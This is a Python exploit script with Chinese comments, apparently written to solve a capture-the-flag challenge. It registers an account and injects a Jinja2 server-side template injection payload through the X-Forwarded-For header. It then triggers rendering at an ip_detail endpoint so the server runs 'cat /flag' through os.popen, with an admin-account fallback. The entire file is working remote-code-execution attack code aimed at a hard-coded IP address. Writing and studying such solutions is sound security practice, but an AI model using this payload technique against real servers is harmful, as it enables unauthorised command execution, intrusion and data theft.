import requests
import re
import time
import random
import urllib.parse

TARGET = "http://223.112.5.141:60140"
USERNAME = f"ssti_{random.randint(10000, 99999)}"
PASSWORD = "123456"
FLAG_CMD = "cat /flag"  # 根据实际环境调整

sess = requests.Session()


# 生成双重编码的 SSTI payload
def generate_payload(cmd):
    # 双重花括号绕过第一次渲染
    payload = f"127.0.0.1{{{{'{{'}}config.__class__.__init__.__globals__['os'].popen('{cmd}').read(){{'}}'}}}}"
    return payload


print(f"[*] 创建用户: {USERNAME}")

# 注册用户
register_data = {
    "username": USERNAME,
    "password": PASSWORD,
    "bio": 'hacker'
}
register_resp = sess.post(
    f"{TARGET}/register",
    data=register_data
)
print(f"注册响应: {register_resp.status_code}")

# 登录获取有效 session
print(f"[*] 用户登录")
login_resp = sess.post(
    f"{TARGET}/login",
    data={"username": USERNAME, "password": PASSWORD}
)
session_cookie = sess.cookies.get('session', '')
print(f"登录响应: {login_resp.status_code}, Session: {session_cookie}")

# 生成恶意 payload
print(f"[*] 生成恶意 payload")
malicious_payload = generate_payload(FLAG_CMD)

# 更新 last_ip - 通过访问任何需要认证的页面
print(f"[*] 设置恶意 last_ip")
update_headers = {
    "X-Forwarded-For": malicious_payload,
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Cookie": f"session={session_cookie}"
}

# 访问用户主页触发 last_ip 更新
update_resp = sess.get(
    f"{TARGET}/{USERNAME}",  # 访问用户主页触发 after_request
    headers=update_headers
)
print(f"更新 last_ip 响应: {update_resp.status_code}")

# 等待更新生效
print("[*] 等待服务器更新 last_ip (5秒)")
time.sleep(5)

# 直接访问 /get_last_ip/username 获取 last_ip 内容
print("[*] 直接获取 last_ip 内容")
last_ip_resp = sess.get(
    f"{TARGET}/get_last_ip/{USERNAME}",
    headers={"Cookie": f"session={session_cookie}"}
)

if last_ip_resp.status_code == 200:
    print(f"[*] last_ip 内容: {last_ip_resp.text}")
else:
    print(f"[-] 获取 last_ip 失败: {last_ip_resp.status_code}")
    print(f"响应内容: {last_ip_resp.text}")

# 触发 SSTI 漏洞
print(f"[*] 触发 SSTI 漏洞")
exploit_resp = sess.get(
    f"{TARGET}/ip_detail/{USERNAME}",
    headers={"Cookie": f"session={session_cookie}"}
)

print("[*] 响应状态:", exploit_resp.status_code)
print("[*] 响应内容:")
print(exploit_resp.text[:1000] + "..." if len(exploit_resp.text) > 1000 else exploit_resp.text)

# 提取 flag
flags = re.findall(r"flag\{[^}]*\}", exploit_resp.text)
if flags:
    print(f"\n[+] 成功获取 FLAG: {flags[0]}")
else:
    print("\n[-] 未找到 FLAG, 可能原因:")
    print("1. 文件路径不正确 (尝试 '/flag.txt' 或 '/home/ctf/flag')")
    print("2. 特殊字符被过滤 (尝试 base64 编码命令)")
    print("3. 服务器配置阻止命令执行")

    # 检查响应中是否有错误信息
    if "You need to login first" in exploit_resp.text:
        print("\n[!] 内部请求认证失败，尝试绕过方法...")
        # 尝试使用已知管理员用户名
        admin_username = "admin"
        print(f"[*] 尝试访问管理员账户: {admin_username}")
        admin_resp = sess.get(
            f"{TARGET}/ip_detail/{admin_username}",
            headers={"Cookie": f"session={session_cookie}"}
        )
        print(f"管理员响应: {admin_resp.status_code}")
        print(admin_resp.text)

        # 检查是否有 flag
        admin_flags = re.findall(r"flag\{[^}]*\}", admin_resp.text)
        if admin_flags:
            print(f"\n[+] 成功获取管理员 FLAG: {admin_flags[0]}")
        else:
            print("\n[-] 管理员账户也未找到 FLAG")

    # 保存完整响应
    with open("response.html", "w", encoding="utf-8") as f:
        f.write(exploit_resp.text)
    print("[+] 完整响应已保存到 response.html")